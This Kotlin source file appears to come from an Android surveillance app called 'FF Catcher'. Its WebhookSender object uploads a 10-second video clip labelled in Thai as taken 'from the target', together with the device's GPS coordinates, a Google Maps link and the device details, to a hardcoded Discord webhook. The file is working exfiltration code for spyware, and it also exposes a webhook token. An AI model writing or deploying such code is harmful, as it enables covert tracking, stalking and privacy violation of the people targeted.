package com.bluezy.ffcatcher

import android.content.Context
import android.os.Build
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

object WebhookSender {

    private const val TAG = "WebhookSender"

    // ====== ใส่ webhook ของมึงตรงนี้ ======
    private const val DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1560337373965983918/EF-kwG3q4qydoqNwPTHisku5hQX5L-MbQhimctWGloue9y4RSpyY-K_IiM57Ty9WhRgU"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(90, TimeUnit.SECONDS)
        .readTimeout(90, TimeUnit.SECONDS)
        .build()

    fun sendToDiscord(file: File, gps: GpsHelper.Location?, context: Context) {
        try {
            if (!file.exists() || file.length() < 5000) {
                Log.d(TAG, "skip — file too small: ${file.length()}")
                return
            }

            val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

            val gpsValue = if (gps != null) {
                "[${gps.lat}, ${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon})\n" +
                    "แม่นยำ: ±${gps.accuracy} m · ${gps.provider}"
            } else "❌ ไม่ได้ตำแหน่ง"

            val fields = JSONArray().apply {
                put(JSONObject().apply {
                    put("name", "📍 GPS")
                    put("value", gpsValue)
                    put("inline", false)
                })
                put(JSONObject().apply {
                    put("name", "📱 อุปกรณ์")
                    put("value", "${Build.MANUFACTURER} ${Build.MODEL}\nAndroid ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
                    put("inline", true)
                })
                put(JSONObject().apply {
                    put("name", "📦 ขนาดไฟล์")
                    put("value", "${file.length() / 1024} KB")
                    put("inline", true)
                })
            }

            val embed = JSONObject().apply {
                put("title", "📹 คลิปจากเป้าหมาย (10s)")
                put("color", 0xFF8C00)
                put("fields", fields)
                put("timestamp", ts)
                put("footer", JSONObject().put("text", "by BluezyGPT"))
            }

            val payload = JSONObject().apply {
                put("username", "FF Catcher")
                put("embeds", JSONArray().put(embed))
            }

            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("payload_json", payload.toString())
                .addFormDataPart(
                    "files[0]",
                    file.name,
                    file.asRequestBody("video/mp4".toMediaType())
                )
                .build()

            val req = Request.Builder().url(DISCORD_WEBHOOK).post(body).build()
            val res = client.newCall(req).execute()
            val status = res.code
            val txt = res.body?.string() ?: ""
            res.close()

            if (status in 200..299) Log.d(TAG, "sent OK ($status) — ${file.length()/1024} KB")
            else Log.e(TAG, "webhook $status: $txt")
        } catch (e: Exception) {
            Log.e(TAG, "send fail: ${e.message}")
        }
    }
}
